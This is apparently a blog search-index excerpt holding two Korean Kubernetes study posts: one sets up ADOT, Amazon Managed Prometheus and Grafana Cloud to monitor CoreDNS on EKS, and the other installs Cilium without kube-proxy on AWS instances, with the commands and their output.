192.168.2.198 ip-192-168-2-198.ap-northeast-2.compute.internal \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; # pod/ethtool-exporter-jbdlx 1/1 Running 0 51s 192.168.1.219 ip-192-168-1-219.ap-northeast-2.compute.internal \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; # pod/ethtool-exporter-pj2r7 1/1 Running 0 51s 192.168.3.85 ip-192-168-3-85.ap-northeast-2.compute.internal \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; # NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR # service/ethtool-exporter ClusterIP None \u0026lt;none\u0026gt; 9417/TCP 51s app=ethtool-exporter # service/kubernetes ClusterIP 10.100.0.1 \u0026lt;none\u0026gt; 443/TCP 16h \u0026lt;none\u0026gt; (c) ADOT(AWS Distro for OpenTelemetry) Collector 요구사항 체크 Pre-requisite 를 유의해야할 것 같습니다.\nDocs: Requirements for Getting Started with ADOT using EKS Add-Ons\nkubectl, eksctl, AWS CLI v2 : 설치 확인\nCluster 버전 확인 : v1.21 이상 확인\nkubectl version | grep \u0026#34;Server Version\u0026#34; # Server Version: v1.30.6-eks-7f9249a ADOT add-on 호환 버전 확인 : v0.62.1 이하 버전이 아니면 별도 작업 필요없음. aws eks describe-addon-versions --addon-name adot --kubernetes-version 1.30 --query \u0026#39;addons[0].addonVersions[*].addonVersion\u0026#39; # [ # \u0026#34;v0.102.1-eksbuild.2\u0026#34;, # \u0026#34;v0.102.1-eksbuild.1\u0026#34;, # \u0026#34;v0.102.0-eksbuild.1\u0026#34; # ] (d) ADOT Collector를 위한 cert-manager 설치 kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.8.2/cert-manager.yaml kubectl get pod -n cert-manager # NAME READY STATUS RESTARTS AGE # cert-manager-cainjector-5dbdc949c4-r2wpn 1/1 Running 0 29s # cert-manager-d68cffc95-wsx5c 1/1 Running 0 29s # cert-manager-webhook-759ddb6555-fzl24 1/1 Running 0 29s (e) ADOT Collector를 위한 IRSA 생성 해당 Policy ARN이 실제 존재하는지 정도는 체크하고 생성하면 정신건강에 좋습니다.\necho :$AWS_REGION:$EKS_CLUSTER_NAME: # :ap-northeast-2:myeks: eksctl create iamserviceaccount \\ --name adot-collector \\ --namespace default \\ --region $AWS_REGION \\ --cluster $EKS_CLUSTER_NAME \\ --attach-policy-arn arn:aws:iam::aws:policy/AmazonPrometheusRemoteWriteAccess \\ --approve \\ --override-existing-serviceaccounts # 2024-11-03 11:27:22 [ℹ] 1 iamserviceaccount (default/adot-collector) was included (based on the include/exclude rules) # 2024-11-03 11:27:22 [!] metadata of serviceaccounts that exist in Kubernetes will be updated, as --override-existing-serviceaccounts was set # 2024-11-03 11:27:22 [ℹ] 1 task: { # 2 sequential sub-tasks: { # create IAM role for serviceaccount \u0026#34;default/adot-collector\u0026#34;, # create serviceaccount \u0026#34;default/adot-collector\u0026#34;, # } }2024-11-03 11:27:22 [ℹ] building iamserviceaccount stack \u0026#34;eksctl-myeks-addon-iamserviceaccount-default-adot-collector\u0026#34; # 2024-11-03 11:27:22 [ℹ] deploying stack \u0026#34;eksctl-myeks-addon-iamserviceaccount-default-adot-collector\u0026#34; # 2024-11-03 11:27:22 [ℹ] waiting for CloudFormation stack \u0026#34;eksctl-myeks-addon-iamserviceaccount-default-adot-collector\u0026#34; # 2024-11-03 11:27:52 [ℹ] waiting for CloudFormation stack \u0026#34;eksctl-myeks-addon-iamserviceaccount-default-adot-collector\u0026#34; # 2024-11-03 11:27:52 [ℹ] created serviceaccount \u0026#34;default/adot-collector\u0026#34; (f) ADOT add-on 설치 이미 버전 체크를 해보았지만, 다시 해봅시다.\naws eks describe-addon-versions --addon-name adot --kubernetes-version 1.30 \\ --query \u0026#34;addons[].addonVersions[].[addonVersion, compatibilities[].defaultVersion]\u0026#34; --output text # v0.102.1-eksbuild.2 # True # v0.102.1-eksbuild.1 # False # v0.102.0-eksbuild.1 # False aws eks create-addon --addon-name adot --addon-version v0.102.1-eksbuild.2 --cluster-name $EKS_CLUSTER_NAME # { # \u0026#34;addon\u0026#34;: { # \u0026#34;addonName\u0026#34;: \u0026#34;adot\u0026#34;, # \u0026#34;clusterName\u0026#34;: \u0026#34;myeks\u0026#34;, # \u0026#34;status\u0026#34;: \u0026#34;CREATING\u0026#34;, # \u0026#34;addonVersion\u0026#34;: \u0026#34;v0.102.1-eksbuild.2\u0026#34;, # \u0026#34;health\u0026#34;: { # \u0026#34;issues\u0026#34;: [] # }, # \u0026#34;addonArn\u0026#34;: \u0026#34;arn:aws:eks:ap-northeast-2:\u0026lt;ACCOUNT-ID\u0026gt;:addon/myeks/adot/eec977ee-84a1-85fe-ecbe-a2f51c90e9e7\u0026#34;, # \u0026#34;createdAt\u0026#34;: \u0026#34;2024-11-03T11:31:33.678000+09:00\u0026#34;, # \u0026#34;modifiedAt\u0026#34;: \u0026#34;2024-11-03T11:31:33.694000+09:00\u0026#34;, # \u0026#34;tags\u0026#34;: {} # } # } 제대로 배포되었나 체크해보겠습니다.\nkubectl get po -n opentelemetry-operator-system # NAME READY STATUS RESTARTS AGE # opentelemetry-operator-b7dbbdf7c-tqvfl 2/2 Running 0 64s (g) ADOT Collector 구성 아래와 같이 collector-config-amp.yaml을 작성하고, 배포합니다.\n환경변수 잘 체크해야합니다. AMP_REMOTE_WRITE_ENDPOINT : 먼저 생성했던 그거 맞습니다. AWS_REGION EKS_CLUSTER_NAME # export AMP_REMOTE_WRITE_ENDPOINT=\u0026lt;AMP_REMOTE_WRITE_ENDPOINT\u0026gt; export AMP_REMOTE_WRITE_ENDPOINT=https://aps-workspaces.ap-northeast-2.amazonaws.com/workspaces/ws-0d032a51-2b98-43b1-90cb-f5069329f1af/api/v1/remote_write echo $AMP_REMOTE_WRITE_ENDPOINT # https://aps-workspaces.ap-northeast-2.amazonaws.com/workspaces/ws-0d032a51-2b98-43b1-90cb-f5069329f1af/api/v1/remote_write cat \u0026gt; collector-config-amp.yaml \u0026lt;\u0026lt;EOF --- apiVersion: opentelemetry.io/v1alpha1 kind: OpenTelemetryCollector metadata: name: my-collector-amp spec: mode: deployment serviceAccount: adot-collector podAnnotations: prometheus.io/scrape: \u0026#39;true\u0026#39; prometheus.io/port: \u0026#39;8888\u0026#39; resources: requests: cpu: \u0026#34;1\u0026#34; limits: cpu: \u0026#34;1\u0026#34; config: | extensions: sigv4auth: region: $AWS_REGION service: \u0026#34;aps\u0026#34; receivers: # # Scrape configuration for the Prometheus Receiver # This is the same configuration used when Prometheus is installed using the community Helm chart # prometheus: config: global: scrape_interval: 60s scrape_timeout: 30s external_labels: cluster: $EKS_CLUSTER_NAME scrape_configs: - job_name: kubernetes-pods scrape_interval: 15s scrape_timeout: 5s kubernetes_sd_configs: - role: pod relabel_configs: - action: keep regex: true source_labels: - __meta_kubernetes_pod_annotation_prometheus_io_scrape - action: replace regex: (https?) source_labels: - __meta_kubernetes_pod_annotation_prometheus_io_scheme target_label: __scheme__ - action: replace regex: (.+) source_labels: - __meta_kubernetes_pod_annotation_prometheus_io_path target_label: __metrics_path__ - action: replace regex: ([^:]+)(?::\\d+)?;(\\d+) replacement: \\$\\$1:\\$\\$2 source_labels: - __address__ - __meta_kubernetes_pod_annotation_prometheus_io_port target_label: __address__ - action: labelmap regex: __meta_kubernetes_pod_annotation_prometheus_io_param_(.+) replacement: __param_\\$\\$1 - action: labelmap regex: __meta_kubernetes_pod_label_(.+) - action: replace source_labels: - __meta_kubernetes_namespace target_label: kubernetes_namespace - action: replace source_labels: - __meta_kubernetes_pod_name target_label: kubernetes_pod_name - action: drop regex: Pending|Succeeded|Failed|Completed source_labels: - __meta_kubernetes_pod_phase processors: batch/metrics: timeout: 60s exporters: prometheusremotewrite: endpoint: $AMP_REMOTE_WRITE_ENDPOINT auth: authenticator: sigv4auth service: extensions: [sigv4auth] pipelines: metrics: receivers: [prometheus] processors: [batch/metrics] exporters: [prometheusremotewrite] --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: otel-prometheus-role rules: - apiGroups: - \u0026#34;\u0026#34; resources: - nodes - nodes/proxy - services - endpoints - pods verbs: - get - list - watch - apiGroups: - extensions resources: - ingresses verbs: - get - list - watch - nonResourceURLs: - /metrics verbs: - get --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: otel-prometheus-role-binding roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: otel-prometheus-role subjects: - kind: ServiceAccount name: adot-collector namespace: default EOF cat collector-config-amp.yaml | grep remote_write # endpoint: https://aps-workspaces.ap-northeast-2.amazonaws.com/workspaces/ws-0d032a51-2b98-43b1-90cb-f5069329f1af/api/v1/remote_write 배포\u0026hellip;! kubectl apply -f collector-config-amp.yaml 3. Grafana Cloud 구성 AMG 대신 Grafana Cloud를 사용해보겠습니다. 사용방법은 매우 간단!\nPlugin: Amazon Managed Service for Prometheus@Grafana Labs (a) Grafana Cloud 가입 네 이거 가입해본 적이 없어서 적어보았습니다.\n(b) 플러그인 활성화 with 딸깍 (c) Prometheus Datasource 설정 경로: Home \u0026gt; Connections \u0026gt; Data sources \u0026gt; grafana-amazonprometheus-datasource\nURL 예시: https://aps-workspaces.ap-northeast-2.amazonaws.com/workspaces/ws-0d032a51-2b98-43b1-90cb-f5069329f1af\n끝에 /api/v1/query 넣었다가 계속 에러나서 뭔가 했네요. Docs: Add the Prometheus data source in Grafana Auth: AWS의 SigV4를 지원합니다. Access Key ID / Secret Access Key 입력. Assume Role의 경우, Preview를 위한 티켓을 하기엔 시간이 없어 Skip. Additional: 리전과 TLS 설정 4. Query 작성 후 확인 블로그에 나온 대로, 정상 출력되는 것은 확인하였습니다.\n9. Vaporware 중간에 패닉이 걸려서, Grafana Cloud와 연결 목적으로 Grafana Cloud Agent를 배포해야하나 했는데, 기우였습니다. 그렇게 필요는 없어보입니다.\nConfiguring Grafana Cloud Agent for Amazon Managed Service for Prometheus/AWS Open Source Blog Amazon Managed Service for Prometheus/Grafana Labs Plugins (a) 권한 부여 작업 curl https://gist.githubusercontent.com/rfratto/b6c5888e89faed3b04fa2533e0bec1a2/raw/bb9aa5e560009e98b48861d0b2ce54fc8a4303e6/script.bash -o agent-permissions-aks.bash sed -i \u0026#34;s/YOUR_EKS_CLUSTER_NAME/${EKS_CLUSTER_NAME}/g\u0026#34; agent-permissions-aks.bash cat agent-permissions-aks.bash | head -n 4 # ##!/bin/bash # CLUSTER_NAME=myeks # SEE THIS LINE IF CHANGED TO YOUR CLUSTER NAME # AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \u0026#34;Account\u0026#34; --output text) # OIDC_PROVIDER=$(aws eks describe-cluster --name $CLUSTER_NAME --query \u0026#34;cluster.identity.oidc.issuer\u0026#34; --output text | sed -e \u0026#34;s/^https:\\/\\///\u0026#34;) 실행합시다.\nls -al agent-permissions-aks.bash # -rw-r--r-- 1 root root 4341 Nov 3 12:09 agent-permissions-aks.bash chmod u+x agent-permissions-aks.bash ls -al agent-permissions-aks.bash # -rwxr--r-- 1 root root 4341 Nov 3 12:09 agent-permissions-aks.bash ./agent-permissions-aks.bash 중간 중간, error에 섬찟했지만, 생성은 된거 같습니다.\n# ./agent-permissions-aks.bash Creating a new trust policy An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name EKS-GrafanaAgent-AMP-ServiceAccount-Role cannot be found. Appending to the existing trust policy An error occurred (NoSuchEntity) when calling the GetPolicy operation: Policy arn:aws:iam::\u0026lt;ACCOUNT-ID\u0026gt;:policy/AWSManagedPrometheusWriteAccessPolicy was not found. Creating a new permission policy AWSManagedPrometheusWriteAccessPolicy { \u0026#34;Policy\u0026#34;: { \u0026#34;PolicyName\u0026#34;: \u0026#34;AWSManagedPrometheusWriteAccessPolicy\u0026#34;, \u0026#34;PolicyId\u0026#34;: \u0026#34;ANPASTWNT54JUITZSLWOX\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::\u0026lt;ACCOUNT-ID\u0026gt;:policy/AWSManagedPrometheusWriteAccessPolicy\u0026#34;, \u0026#34;Path\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;DefaultVersionId\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;AttachmentCount\u0026#34;: 0, \u0026#34;PermissionsBoundaryUsageCount\u0026#34;: 0, \u0026#34;IsAttachable\u0026#34;: true, \u0026#34;CreateDate\u0026#34;: \u0026#34;2024-11-03T03:16:10+00:00\u0026#34;, \u0026#34;UpdateDate\u0026#34;: \u0026#34;2024-11-03T03:16:10+00:00\u0026#34; } } An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name EKS-GrafanaAgent-AMP-ServiceAccount-Role cannot be found. EKS-GrafanaAgent-AMP-ServiceAccount-Role role does not exist. Creating a new role with a trust and permission policy arn:aws:iam::\u0026lt;ACCOUNT-ID\u0026gt;:role/EKS-GrafanaAgent-AMP-ServiceAccount-Role 2024-11-03 12:16:16 [ℹ] IAM Open ID Connect provider is already associated with cluster \u0026#34;myeks\u0026#34; in \u0026#34;ap-northeast-2\u0026#34; (b) Grafana Cloud Agent 배포 grafana/agent@v0.18.4 Clean up K8s deployment methods (#749) 블로그처럼 해보려고 했는데, 해당 install-sigv4.sh 파일이 v0.18.4 까지만 지원하는 것이어서 해보고 안되면 종료하겠습니다.\nkubectl create namespace grafana-agent; \\ WORKSPACE=\u0026#34;ws-0d032a51-2b98-43b1-90cb-f5069329f1af\u0026#34; \\ ROLE_ARN=\u0026#34;arn:aws:iam::\u0026lt;ACCOUNT-ID\u0026gt;:role/EKS-GrafanaAgent-AMP-ServiceAccount-Role\u0026#34; \\ REGION=\u0026#34;ap-northeast-2\u0026#34; \\ NAMESPACE=\u0026#34;grafana-agent\u0026#34; \\ REMOTE_WRITE_URL=\u0026#34;https://aps-workspaces.$REGION.amazonaws.com/workspaces/$WORKSPACE/api/v1/remote_write\u0026#34; \\ /bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/grafana/agent/v0.18.4/production/kubernetes/install-sigv4.sh)\u0026#34; | kubectl apply -f - # namespace/grafana-agent created # serviceaccount/grafana-agent created # configmap/grafana-agent created # configmap/grafana-agent-deployment created # daemonset.apps/grafana-agent created # deployment.apps/grafana-agent-deployment created # resource mapping not found for name: \u0026#34;grafana-agent\u0026#34; namespace: \u0026#34;\u0026#34; from \u0026#34;STDIN\u0026#34;: no matches for kind \u0026#34;ClusterRole\u0026#34; in version \u0026#34;rbac.authorization.k8s.io/v1beta1\u0026#34; # ensure CRDs are installed first # resource mapping not found for name: \u0026#34;grafana-agent\u0026#34; namespace: \u0026#34;\u0026#34; from \u0026#34;STDIN\u0026#34;: no matches for kind \u0026#34;ClusterRoleBinding\u0026#34; in version \u0026#34;rbac.authorization.k8s.io/v1beta1\u0026#34; # ensure CRDs are installed first 그래서 아래와 같이 수동으로 재구성해서 배포 다시 했습니다.\n수정된 부분 기존: v1beta1 수정: v1 --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: grafana-agent rules: - apiGroups: - \u0026#34;\u0026#34; resources: - nodes - nodes/proxy - services - endpoints - pods verbs: - get - list - watch - nonResourceURLs: - /metrics verbs: - get --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: grafana-agent roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: grafana-agent subjects: - kind: ServiceAccount name: grafana-agent namespace: grafana-agent ","date":"2024-10-30T23:44:01+09:00","permalink":"https://blog.minseong.xyz/post/kans-9w-monitoring-codedns-in-eks-with-grafana-cloud/","section":"post","tags":["kans","eks","grafana","otel","coredns"],"title":"Monitoring CoreDNS in EKS with Grafana Cloud"},{"categories":null,"contents":"그럼 매번 실패만 했던 Cilium 배포를 한번 해볼까요?\nCloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\n1. CSP VM 골라보기 이렇게 쓴 이유는 결국 네트워크를 잘 알아야하는데,\n작년에 할 때는 그런거 생각도 안하고 그냥 올려보려 했으니 당연히 안 돌아가겠죠?\ntrying2adult/What Is XDP And How Do You Use It In Linux 그냥 곰곰히 오리duckduckgo랑 투닥거리다보니, 비록 연식이 되긴 했지만\n클릭을 안하고는 못배길 위의 블로그 제목이 눈에 띄였습니다.\na. 사전 조사 커널: 현재 리눅스 커널 버전이 마이너 버전은 못 외우겠지만, 대충 메이저가 6버전이니 PASS NIC: ENA(Elastic Network Adapter) 드라이버 언급이 나온 것으로 봐선,\n지원 인스턴스를 올리면 덜 헤멜 것 같은 느낌이 듭니다. MTU 상한: cilium 최신 버전도 상한값이 3818인지 확인하면 좋을 듯합니다. NIC channels for RX/TX Queue: 절반 이상을 비워야한다는데, 채널 수 모르면 좀 많이 헤맬 것 같습니다. b. AWS CLI로 확인 Docs: Test whether enhanced networking is enabled Query for the latest Amazon Linux AMI IDs using AWS Systems Manager Parameter Store 스터디에서 제공된 CloudFormation파일 중 AMI은\nCanonical에서 관리하는 SSM 파라미터를 통해 최신화를 할 수 있었습니다.\n그래서 그냥 이 SSM 파라미터를 통해 AMI ID를 얻어와 보죠.\naws ssm get-parameters --names /aws/service/canonical/ubuntu/server/22.04/stable/current/amd64/hvm/ebs-gp2/ami-id --region ap-northeast-2 { \u0026#34;Parameters\u0026#34;: [ { \u0026#34;Name\u0026#34;: \u0026#34;/aws/service/canonical/ubuntu/server/22.04/stable/current/amd64/hvm/ebs-gp2/ami-id\u0026#34;, \u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;ami-042e76978adeb8c48\u0026#34;, \u0026#34;Version\u0026#34;: 30, \u0026#34;LastModifiedDate\u0026#34;: \u0026#34;2024-09-27T13:11:50.127000+09:00\u0026#34;, \u0026#34;ARN\u0026#34;: \u0026#34;arn:aws:ssm:ap-northeast-2::parameter/aws/service/canonical/ubuntu/server/22.04/stable/current/amd64/hvm/ebs-gp2/ami-id\u0026#34;, \u0026#34;DataType\u0026#34;: \u0026#34;aws:ec2:image\u0026#34; } ], \u0026#34;InvalidParameters\u0026#34;: [] } 당연히 enaSupport가 true로 나오네요.\naws ec2 describe-images --image-id ami-042e76978adeb8c48 --query \u0026#34;Images[].EnaSupport\u0026#34; # [ # true # ] 눈감고 c5.16xlarge 를 띄워볼까 싶긴한데, 아래 문서에서 Nitro v2 버전 탭에 T3도 있는 것을 확인했네요.\nCloudformation YAML에 기본 정의된 t3.xlarge를 써보겠습니다.\nVirtualized instances /AWS c. 프로비저닝 후 기본 체크 스터디에서 제공된 대로, kube-proxy 없이 운용 테스트를 할 것이기에 확인을 해보겠습니다.\n이미 kubeadm 배포 시, --skip-phases=addon/kube-proxy param이 적용되어 있습니다.\nNo kube-proxy\n# Access to Control Plane Node ssh -i $Keypair ubuntu@$ControlPlaneIP # Not ready because of no kube-proxy kubectl get nodes # NAME STATUS ROLES AGE VERSION # k8s-s NotReady control-plane 14m v1.30.6 # k8s-w1 NotReady \u0026lt;none\u0026gt; 13m v1.30.6 # k8s-w2 NotReady \u0026lt;none\u0026gt; 13m v1.30.6 # No kube-proxy kubectl cluster-info # Kubernetes control plane is running at https://192.168.10.10:6443 # CoreDNS is running at https://192.168.10.10:6443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy # No kube-proxy kubectl get pod -A # NAMESPACE NAME READY STATUS RESTARTS AGE # kube-system coredns-55cb58b774-h9dnm 0/1 Pending 0 14m # kube-system coredns-55cb58b774-vjzrk 0/1 Pending 0 14m # kube-system etcd-k8s-s 1/1 Running 0 14m # kube-system kube-apiserver-k8s-s 1/1 Running 0 14m # kube-system kube-controller-manager-k8s-s 1/1 Running 0 14m # kube-system kube-scheduler-k8s-s 1/1 Running 0 14m 커널 확인: 안해도 되지만, 한번 보겠습니다. # Kernel Version uname -a # Linux k8s-s 6.8.0-1015-aws #16~22.04.1-Ubuntu SMP Mon Aug 19 19:38:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux hostnamectl | grep Kernel # Kernel: Linux 6.8.0-1015-aws # XDP Support grep -i CONFIG_XDP_SOCKETS /boot/config-$(uname -r) # CONFIG_XDP_SOCKETS=y # CONFIG_XDP_SOCKETS_DIAG=m NIC 확인 netplan status | grep ethernet # ● 1: lo ethernet UNKNOWN/UP (unmanaged) # ● 2: ens5 ethernet UP (networkd: ens5) # MTU ip link show ens5 | grep mtu # 2: ens5: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 9001 qdisc mq state UP mode DEFAULT group default qlen 1000 # RX/TX Queue ethtool -l ens5 # Channel parameters for ens5: # Pre-set maximums: # RX:\tn/a # TX:\tn/a # Other:\tn/a # Combined:\t4 # Current hardware settings: # RX:\tn/a # TX:\tn/a # Other:\tn/a # Combined:\t4 # Driver ethtool -i ens5 | grep ena # driver: ena Cilium에서 요구사항을 따로 살펴봐야겠지만,\nMTU 및 RX/TX Queue 관련 채널 값을 바꿔야할 것으로 보입니다.\n2. Cilium 설치 설치 전에 미리 OS에서 파라미터 조정을 해보겠습니다. a. 파라미터 조정 크게 두 가지 파라미터 조정해둡니다.\nMaxium MTU: 3498 최신문서(v1.16.3)에서는 값이 더 낮아져서 3498로 조정합니다. RX/TX Queue: more than half RX/TX Queue는 그렇다고 치고, MTU의 경우에는 왜 조정해야되는지 아래에도 설명되어있으니 참조하시면 됩니다.\nNodPort on AWS/cilium # MTU ip link set dev ens5 mtu 3498 ip link show ens5 | grep mtu 2: ens5: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 3498 qdisc mq state UP mode DEFAULT group default qlen 1000 # RX/TX Queue ethtool -L ens5 combined 1 ethtool -l ens5 # Channel parameters for ens5: # Pre-set maximums: # RX:\tn/a # TX:\tn/a # Other:\tn/a # Combined:\t4 # Current hardware settings: # RX:\tn/a # TX:\tn/a # Other:\tn/a # Combined:\t1 b. Cilium CLI 설치 그냥 혹시 모르니 Cilium CLI 설치 미리 해두겠습니다. 아직 Major가 v1은 아닙니다.\nDocs: Install the Cilium CLI curl -s https://raw.githubusercontent.com/cilium/cilium-cli/main/stable.txt # v0.16.19 CILIUM_CLI_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/cilium-cli/main/stable.txt) CLI_ARCH=amd64 if [ \u0026#34;$(uname -m)\u0026#34; = \u0026#34;aarch64\u0026#34; ]; then CLI_ARCH=arm64; fi curl -L --fail --remote-name-all https://github.com/cilium/cilium-cli/releases/download/${CILIUM_CLI_VERSION}/cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum} sha256sum --check cilium-linux-${CLI_ARCH}.tar.gz.sha256sum sudo tar xzvfC cilium-linux-${CLI_ARCH}.tar.gz /usr/local/bin rm cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum} 버전 확인을 안내대로 해봅시다.\ncilium version --client # cilium-cli: v0.16.19 compiled with go1.23.1 on linux/amd64 # cilium image (default): v1.16.2 # cilium image (stable): v1.16.3 c. helm 배포 그냥 실패하면 cilium CLI로 설치하고 눈 감겠습니다.\nhelm repo add cilium https://helm.cilium.io/ # \u0026#34;cilium\u0026#34; has been added to your repositories helm repo update # Hang tight while we grab the latest from your chart repositories... # ...Successfully got an update from the \u0026#34;cilium\u0026#34; chart repository # Update Complete. ⎈Happy Helming!⎈ helm install cilium cilium/cilium --version 1.16.3 --namespace kube-system \\ --set k8sServiceHost=192.168.10.10 --set k8sServicePort=6443 --set debug.enabled=true \\ --set rollOutCiliumPods=true --set routingMode=native --set autoDirectNodeRoutes=true \\ --set bpf.masquerade=true --set bpf.hostRouting=true --set endpointRoutes.enabled=true \\ --set ipam.mode=kubernetes --set k8s.requireIPv4PodCIDR=true --set kubeProxyReplacement=true \\ --set ipv4NativeRoutingCIDR=192.168.0.0/16 --set installNoConntrackIptablesRules=true \\ --set hubble.ui.enabled=true --set hubble.relay.enabled=true --set prometheus.enabled=true --set operator.prometheus.enabled=true --set hubble.metrics.enableOpenMetrics=true \\ --set hubble.metrics.enabled=\u0026#34;{dns:query;ignoreAAAA,drop,tcp,flow,port-distribution,icmp,httpV2:exemplars=true;labelsContext=source_ip\\,source_namespace\\,source_workload\\,destination_ip\\,destination_namespace\\,destination_workload\\,traffic_direction}\u0026#34; \\ --set operator.replicas=1 주요 파라미터 설명 파라미터 설명 debug.enabled cilium 파드에 로그 레벨을 debug 설정 autoDirectNodeRoutes 동일 대역 내의 노드들 끼리는 상대 노드의 podCIDR 대역의 라우팅이 자동으로 설정 endpointRoutes.enabled 호스트에 endpoint(파드)별 개별 라우팅 설정 hubble.relay.enabled hubble 활성화 hubble.ui.enabled hubble UI 활성화 ipam.mode k8s IPAM 활용 k8s.requireIPv4PodCIDR k8s에서 IPv4 Pod CIDR를 요구 kubeProxyReplacement kube-proxy 없이 (최대한) 대체할수 있수 있게 ipv4NativeRoutingCIDR=192.168.0.0/16 해당 대역과 통신 시 IP Masq 하지 않음, 보통 사내망 대역을 지정 operator.replicas cilium-operator 파드 기본 1개 enableIPv4Masquerade 파드를 위한 Masquerade bpf.masquerade 추가로 Masquerade 을 BPF 로 처리 NAME: cilium LAST DEPLOYED: Sun Oct 27 11:58:59 2024 NAMESPACE: kube-system STATUS: deployed REVISION: 1 TEST SUITE: None NOTES: You have successfully installed Cilium with Hubble Relay and Hubble UI. Your release version is 1.16.3. For any further help, visit https://docs.cilium.io/en/v1.16/gettinghelp \u0026hellip; 스터디에서 안내해주신 파라미터를 넣어서 했습니다만, 이게 왜 되지\u0026hellip;?\n이제, 추가 파라미터 주입안해도 정상적으로 해당 버전이 작동하고 있다고 확인할 수 있었습니다.\ncilium version # cilium-cli: v0.16.19 compiled with go1.23.1 on linux/amd64 # cilium image (default): v1.16.2 # cilium image (stable): v1.16.3 # cilium image (running): 1.16.3 3. Cilium 살펴보기 a. 배포 이후 상태 이제 kube-proxy 없이도 각 Node가 Ready 상태임을 확인할 수 있습니다.\nkubectl get nodes # NAME STATUS ROLES AGE VERSION # k8s-s Ready control-plane 20h v1.30.6 # k8s-w1 Ready \u0026lt;none\u0026gt; 20h v1.30.6 # k8s-w2 Ready \u0026lt;none\u0026gt; 20h v1.30.6 kube-proxy는 없습니다.\nkubectl get pods -A # NAMESPACE NAME READY STATUS RESTARTS AGE # kube-system cilium-2g4bh 1/1 Running 0 91m # kube-system cilium-522nn 1/1 Running 0 91m # kube-system cilium-csdd7 1/1 Running 0 91m # kube-system cilium-envoy-82drs 1/1 Running 0 91m # kube-system cilium-envoy-96vst 1/1 Running 0 91m # kube-system cilium-envoy-gnh2q 1/1 Running 0 91m # kube-system cilium-operator-76bb588dbc-57945 1/1 Running 0 91m # kube-system coredns-55cb58b774-h9dnm 1/1 Running 0 20h # kube-system coredns-55cb58b774-vjzrk 1/1 Running 0 20h # kube-system etcd-k8s-s 1/1 Running 0 20h # kube-system hubble-relay-88f7f89d4-r4ccq 1/1 Running 0 91m # kube-system hubble-ui-59bb4cb67b-l5ttc 2/2 Running 0 91m # kube-system kube-apiserver-k8s-s 1/1 Running 0 20h # kube-system kube-controller-manager-k8s-s 1/1 Running 0 20h # kube-system kube-scheduler-k8s-s 1/1 Running 0 20h kubectl get svc -A # NAMESPACE NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE # default kubernetes ClusterIP 10.10.0.1 \u0026lt;none\u0026gt; 443/TCP 20h # kube-system cilium-envoy ClusterIP None \u0026lt;none\u0026gt; 9964/TCP 93m # kube-system hubble-metrics ClusterIP None \u0026lt;none\u0026gt; 9965/TCP 93m # kube-system hubble-peer ClusterIP 10.10.161.48 \u0026lt;none\u0026gt; 443/TCP 93m # kube-system hubble-relay ClusterIP 10.10.150.231 \u0026lt;none\u0026gt; 80/TCP 93m # kube-system hubble-ui ClusterIP 10.10.183.16 \u0026lt;none\u0026gt; 80/TCP 93m # kube-system kube-dns ClusterIP 10.10.0.10 \u0026lt;none\u0026gt; 53/UDP,53/TCP,9153/TCP 20h NAT 테이블에 설정된 모든 규칙을 알아봅시다: iptables -t -nat -S\niptables -t nat -S # -P PREROUTING ACCEPT # -P INPUT ACCEPT # -P OUTPUT ACCEPT # -P POSTROUTING ACCEPT # -N CILIUM_OUTPUT_nat # -N CILIUM_POST_nat # -N CILIUM_PRE_nat # -N KUBE-KUBELET-CANARY # -A PREROUTING -m comment --comment \u0026#34;cilium-feeder: CILIUM_PRE_nat\u0026#34; -j CILIUM_PRE_nat # -A OUTPUT -m comment --comment \u0026#34;cilium-feeder: CILIUM_OUTPUT_nat\u0026#34; -j CILIUM_OUTPUT_nat # -A POSTROUTING -m comment --comment \u0026#34;cilium-feeder: CILIUM_POST_nat\u0026#34; -j CILIUM_POST_nat b. Cilium CLI 활용하기 Sigrid Jin님의 가이드를 참조했습니다.\nAlias 설정을 해두면 편하게 사용할 수 있다고 하니, 일단 해봅시다.\nhelm 배포 시, kube-proxy를 대체하도록 설정하였으니,\n마지막에 당연히 True가 나오긴 해야합니다.\nkubectl get -l k8s-app=cilium pods -n kube-system --field-selector spec.nodeName=k8s-s -o jsonpath=\u0026#39;{.items[0].metadata.name}\u0026#39; # cilium-522nn export CILIUMPOD0=$(kubectl get -l k8s-app=cilium pods -n kube-system --field-selector spec.nodeName=k8s-s -o jsonpath=\u0026#39;{.items[0].metadata.name}\u0026#39;) kubectl exec -it $CILIUMPOD0 -n kube-system -c cilium-agent -- cilium status # KVStore: Ok Disabled # Kubernetes: Ok 1.30 (v1.30.6) [linux/amd64] # Kubernetes APIs: [\u0026#34;EndpointSliceOrEndpoint\u0026#34;, \u0026#34;cilium/v2::CiliumClusterwideNetworkPolicy\u0026#34;, 